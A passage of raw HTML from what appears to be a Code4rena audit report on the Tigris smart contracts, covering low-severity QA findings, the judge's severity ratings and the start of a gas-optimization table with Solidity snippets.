2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[19] Missing NATSPEC</h2>\n<p>Consider adding NATSPEC on all public/external functions to improve documentation.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/TradingExtension.sol#L190\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/TradingExtension.sol#L190</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L168\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L168</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L183\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L183</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L349\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L349</a></p>\n<h2 id=\"20-interchangeable-usage-of-uint-and-uint256\" style=\"position:relative;\"><a href=\"#20-interchangeable-usage-of-uint-and-uint256\" aria-label=\"20 interchangeable usage of uint and uint256 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[20] Interchangeable usage of uint and uint256</h2>\n<p>Consider using only one approach throughout the codebase, e.g. only uint or only uint256.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L223-L224\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L223-L224</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L316-L317\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L316-L317</a></p>\n<h2 id=\"21-move-requirevalidation-statements-to-the-top-of-the-function-when-validating-input-parameters\" style=\"position:relative;\"><a href=\"#21-move-requirevalidation-statements-to-the-top-of-the-function-when-validating-input-parameters\" aria-label=\"21 move requirevalidation statements to the top of the function when validating input parameters permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[21] Move require/validation statements to the top of the function when validating input parameters</h2>\n<p>Consider moving the validation on <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L966\">L966</a> above the conditional on <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L955\">L955</a> for <code>Trading.setFees()</code>.</p>\n<h2 id=\"22-remove-consolelog-import-in-locksol\" style=\"position:relative;\"><a href=\"#22-remove-consolelog-import-in-locksol\" aria-label=\"22 remove consolelog import in locksol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[22] Remove console.log import in <code>Lock.sol</code></h2>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L4\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L4</a></p>\n<h2 id=\"23-draft-openzeppelin-dependencies\" style=\"position:relative;\"><a href=\"#23-draft-openzeppelin-dependencies\" aria-label=\"23 draft openzeppelin dependencies permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[23] Draft OpenZeppelin dependencies</h2>\n<p>OpenZeppelin contracts may be considered draft contracts if they have not received adequate security auditing or are liable to change with future development.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableToken.sol#L4\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableToken.sol#L4</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableToken.sol#L7\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableToken.sol#L7</a></p>\n<h3 id=\"recommendation-6\" style=\"position:relative;\"><a href=\"#recommendation-6\" aria-label=\"recommendation 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Consider waiting until the contract is finalized. Otherwise, make sure that the development team is aware of the risks of using a draft OpenZeppelin contract and accept the risk-benefit trade-off.</p>\n<h2 id=\"24-named-imports-can-be-used\" style=\"position:relative;\"><a href=\"#24-named-imports-can-be-used\" aria-label=\"24 named imports can be used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[24] Named imports can be used</h2>\n<p>It’s possible to name the imports to improve code readability. E.g. <code>import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";</code> can be rewritten as <code>import {IERC20} from “import “@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol”;</code></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L6\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L6</a></p>\n<h2 id=\"25-imports-can-be-grouped-together\" style=\"position:relative;\"><a href=\"#25-imports-can-be-grouped-together\" aria-label=\"25 imports can be grouped together permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[25] Imports can be grouped together</h2>\n<p>Consider importing OZ first, then all interfaces, then all utils.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L4-L12\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L4-L12</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/TradingExtension.sol#L4-L8\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/TradingExtension.sol#L4-L8</a></p>\n<h2 id=\"26-constant-redefined-elsewhere\" style=\"position:relative;\"><a href=\"#26-constant-redefined-elsewhere\" aria-label=\"26 constant redefined elsewhere permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[26] Constant redefined elsewhere</h2>\n<p>Consider defining in only one contract so that values cannot become out of sync when only one location is updated. </p>\n<p>A cheap way to store constants in a single location is to create an internal constant in a library. If the variable is a local cache of another contract’s value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don’t get out of sync.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L95\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L95</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/TradingExtension.sol#L11\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/TradingExtension.sol#L11</a></p>\n<h2 id=\"27-convert-repeated-validation-statements-into-a-function-modifier-to-improve-code-reusability\" style=\"position:relative;\"><a href=\"#27-convert-repeated-validation-statements-into-a-function-modifier-to-improve-code-reusability\" aria-label=\"27 convert repeated validation statements into a function modifier to improve code reusability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[27] Convert repeated validation statements into a function modifier to improve code reusability</h2>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L107\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L107</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L330\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L330</a></p>\n<h2 id=\"28-large-multiples-of-ten-should-use-scientific-notation\" style=\"position:relative;\"><a href=\"#28-large-multiples-of-ten-should-use-scientific-notation\" aria-label=\"28 large multiples of ten should use scientific notation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[28] Large multiples of ten should use scientific notation.</h2>\n<p>Using scientific notation for large multiples of ten will improve code readability.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/TradingExtension.sol#L26\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/TradingExtension.sol#L26</a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/657#issuecomment-1366191229\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>[01] Use <code>.call</code> instead of <code>.transfer</code> to send ether</p>\n<p>Low</p>\n<p>[02] Unbounded loop</p>\n<p>Low</p>\n<p>[03] Use the safe variant and <code>ERC721.mint</code></p>\n<p>Low</p>\n<p>[04] Usage of deprecated chainlink API</p>\n<p>Low</p>\n<p>[05] Lack of checks-effects-interactions</p>\n<p>Low</p>\n<p>[06] Lack of zero address checks for <code>Trading.sol</code> constructor for the variables <code>_position</code>, <code>_gov</code> and <code>_pairsContract</code></p>\n<p>Low</p>\n<p>[07] Add an event for critical parameter changes</p>\n<p>Non-Critical</p>\n<p>[08] Missing unit tests</p>\n<p>Refactoring</p>\n<p>[09] Pragma float</p>\n<p>Non-Critical</p>\n<p>[10] Contract layout and order of functions</p>\n<p>Non-Critical</p>\n<p>[11] Use time units directly</p>\n<p>Refactoring</p>\n<p>[12] Declare interfaces on separate files</p>\n<p>Refactoring</p>\n<p>[13] Constants should be upper case</p>\n<p>Refactoring</p>\n<p>[14] Use <code>private constant</code> consistently</p>\n<p>Non-Critical</p>\n<p>[15] Add a limit for the maximum number of characters per line</p>\n<p>Non-Critical</p>\n<p>[16] Declaring a <code>return named variable</code> and returning a manual value for the same function</p>\n<p>Refactoring</p>\n<p>[17] Lack of spacing in comment</p>\n<p>Non-Critical</p>\n<p>[18] Critical changes should use two-step procedure</p>\n<p>Non-Critical</p>\n<p>[19] Missing NATSPEC</p>\n<p>Non-Critical</p>\n<p>[20] Interchangeable usage of uint and uint256</p>\n<p>Non-Critical</p>\n<p>[21] Move require/validation statements to the top of the function when validating input parameters</p>\n<p>Refactoring</p>\n<p>[22] Remove console.log import in <code>Lock.sol</code></p>\n<p>Non-Critical</p>\n<p>[23] Draft openzeppelin dependencies</p>\n<p>Refactoring</p>\n<p>[24] Named imports can be used</p>\n<p>Non-Critical</p>\n<p>[25] Imports can be grouped together</p>\n<p>Non-Critical</p>\n<p>[26] Constant redefined elsewhere</p>\n<p>Refactoring</p>\n<p>[27] Convert repeated validation statements into a function modifier to improve code reusability</p>\n<p>Refactoring</p>\n<p>[28] Large multiples of ten should use scientific notation.</p>\n<p>Refactoring</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 7 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/365\">report highlighted below</a> by <strong>IllIllI</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/663\">Deekshith99</a>,\n<a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/617\">JC</a>,\n<a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/608\">c3phas</a>,\n<a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/550\">Aymen0909</a>,\n<a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/218\">Faith</a>, and\n<a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/179\">ReyAdmirado</a>\n.</em></p>\n<h2 id=\"gas-optimizations-summary\" style=\"position:relative;\"><a href=\"#gas-optimizations-summary\" aria-label=\"gas optimizations summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations Summary</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n<th align=\"center\">Total Gas Saved</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[G‑01]</td>\n<td align=\"left\">Multiple <code>address</code>/ID mappings can be combined into a single <code>mapping</code> of an <code>address</code>/ID to a <code>struct</code>, where appropriate</td>\n<td align=\"center\">5</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑02]</td>\n<td align=\"left\">State variables only set in the constructor should be declared <code>immutable</code></td>\n<td align=\"center\">7</td>\n<td align=\"center\">14679</td>\n</tr>\n<tr>\n<td>[G‑03]</td>\n<td align=\"left\">State variables can be packed into fewer storage slots</td>\n<td align=\"center\">1</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑04]</td>\n<td align=\"left\">Structs can be packed into fewer storage slots</td>\n<td align=\"center\">6</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑05]</td>\n<td align=\"left\">Using <code>storage</code> instead of <code>memory</code> for structs/arrays saves gas</td>\n<td align=\"center\">2</td>\n<td align=\"center\">8400</td>\n</tr>\n<tr>\n<td>[G‑06]</td>\n<td align=\"left\">Avoid contract existence checks by using low level calls</td>\n<td align=\"center\">40</td>\n<td align=\"center\">4000</td>\n</tr>\n<tr>\n<td>[G‑07]</td>\n<td align=\"left\">Multiple accesses of a mapping/array should use a local variable cache</td>\n<td align=\"center\">39</td>\n<td align=\"center\">1638</td>\n</tr>\n<tr>\n<td>[G‑08]</td>\n<td align=\"left\">The result of function calls should be cached rather than re-calling the function</td>\n<td align=\"center\">1</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑09]</td>\n<td align=\"left\"><code>&#x3C;x> += &#x3C;y></code> costs more gas than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> for state variables</td>\n<td align=\"center\">1</td>\n<td align=\"center\">113</td>\n</tr>\n<tr>\n<td>[G‑10]</td>\n<td align=\"left\"><code>internal</code> functions only called once can be inlined to save gas</td>\n<td align=\"center\">2</td>\n<td align=\"center\">40</td>\n</tr>\n<tr>\n<td>[G‑11]</td>\n<td align=\"left\">Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code>-statement</td>\n<td align=\"center\">1</td>\n<td align=\"center\">85</td>\n</tr>\n<tr>\n<td>[G‑12]</td>\n<td align=\"left\"><code>++i</code>/<code>i++</code> should be <code>unchecked{++i}</code>/<code>unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in <code>for</code>- and <code>while</code>-loops</td>\n<td align=\"center\">16</td>\n<td align=\"center\">960</td>\n</tr>\n<tr>\n<td>[G‑13]</td>\n<td align=\"left\"><code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</td>\n<td align=\"center\">4</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑14]</td>\n<td align=\"left\">Optimize names to save gas</td>\n<td align=\"center\">25</td>\n<td align=\"center\">550</td>\n</tr>\n<tr>\n<td>[G‑15]</td>\n<td align=\"left\">Use a more recent version of solidity</td>\n<td align=\"center\">21</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑16]</td>\n<td align=\"left\">Splitting <code>require()</code> statements that use <code>&#x26;&#x26;</code> saves gas</td>\n<td align=\"center\">3</td>\n<td align=\"center\">9</td>\n</tr>\n<tr>\n<td>[G‑17]</td>\n<td align=\"left\">Don’t compare boolean expressions to boolean literals</td>\n<td align=\"center\">2</td>\n<td align=\"center\">18</td>\n</tr>\n<tr>\n<td>[G‑18]</td>\n<td align=\"left\">Ternary unnecessary</td>\n<td align=\"center\">2</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑19]</td>\n<td align=\"left\"><code>require()</code> or <code>revert()</code> statements that check input arguments should be at the top of the function</td>\n<td align=\"center\">1</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑20]</td>\n<td align=\"left\">Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</td>\n<td align=\"center\">2</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑21]</td>\n<td align=\"left\">Functions guaranteed to revert when called by normal users can be marked <code>payable</code></td>\n<td align=\"center\">69</td>\n<td align=\"center\">1449</td>\n</tr>\n<tr>\n<td>[G‑22]</td>\n<td align=\"left\">Don’t use <code>_msgSender()</code> if not supporting EIP-2771</td>\n<td align=\"center\">30</td>\n<td align=\"center\">480</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 280 instances over 22 issues with <strong>32421 gas</strong> saved</p>\n<p>Gas totals use lower bounds of ranges and count two iterations of each <code>for</code>-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.</p>\n<h2 id=\"g01--multiple-addressid-mappings-can-be-combined-into-a-single-mapping-of-an-addressid-to-a-struct-where-appropriate\" style=\"position:relative;\"><a href=\"#g01--multiple-addressid-mappings-can-be-combined-into-a-single-mapping-of-an-addressid-to-a-struct-where-appropriate\" aria-label=\"g01  multiple addressid mappings can be combined into a single mapping of an addressid to a struct where appropriate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑01]  Multiple <code>address</code>/ID mappings can be combined into a single <code>mapping</code> of an <code>address</code>/ID to a <code>struct</code>, where appropriate</h2>\n<p>Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (<strong>20000 gas</strong>) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save <strong>~42 gas per access</strong> due to <a href=\"https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0\">not having to recalculate the key’s keccak256 hash</a> (Gkeccak256 - 30 gas) and that calculation’s associated stack operations.</p>\n<p><em>There are 5 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">32</span><span class=\"mtk1\">        </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allowedAsset</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assetsIndex</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L32-L33</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">265</span><span class=\"mtk1\">       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_allowedAsset</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">266</span><span class=\"mtk1\">       </span><span class=\"mtk11\">mapping</span><span 